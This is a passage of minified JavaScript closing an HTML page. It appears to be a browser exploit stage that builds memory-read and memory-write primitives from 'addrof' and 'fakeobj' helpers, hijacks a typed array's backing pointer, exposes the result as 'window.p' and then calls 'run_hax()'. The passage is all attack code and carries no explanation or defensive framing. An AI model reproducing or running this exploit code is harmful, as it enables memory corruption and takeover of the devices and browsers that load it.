a=read_ptr_at(addrof(j)+8)-208;write_mem(a,read_mem(a-96,208));for(var i=0;i<E.length;i++){var r=read_ptr_at(addrof(E[i])+8);write_ptr_at(r,4294967296*(HASHMAP_BUCKET-20)+1),write_ptr_at(r+8,r+20),write_ptr_at(r+16,2147483668)}write_ptr_at(C+248,133143986207)}();var aa=new Uint32Array(8),ia=new Uint32Array(2),ra=addrof(ia),ta=fakeobj(addrof($)+16);$.buffer=ia,ta[7]=1,$.buffer=aa,ta[4]=ra,ta[5]=(ra-ra%4294967296)/4294967296,ta[7]=1;var ea={write8:function(a,i){aa[4]=a.low,aa[5]=a.hi,i instanceof int64?(ia[0]=i.low,ia[1]=i.hi):(ia[0]=i,ia[1]=0)},write4:function(a,i){aa[4]=a.low,aa[5]=a.hi,ia[0]=i instanceof int64?i.low:i},write2:function(a,i){aa[4]=a.low,aa[5]=a.hi;var r=4294901760&ia[0];ia[0]=i instanceof int64?65535&i.low|r:65535&i|r},write1:function(a,i){aa[4]=a.low,aa[5]=a.hi;var r=4294967040&ia[0];ia[0]=i instanceof int64?255&i.low|r:255&i|r},read8:function(a){return aa[4]=a.low,aa[5]=a.hi,new int64(ia[0],ia[1])},read4:function(a){return aa[4]=a.low,aa[5]=a.hi,ia[0]},read2:function(a){return aa[4]=a.low,aa[5]=a.hi,65535&ia[0]},read1:function(a){return aa[4]=a.low,aa[5]=a.hi,255&ia[0]},leakval:function(a){return V.obj=a,new int64(W[4],W[5])}};window.p=ea,run_hax()}</script></body></html>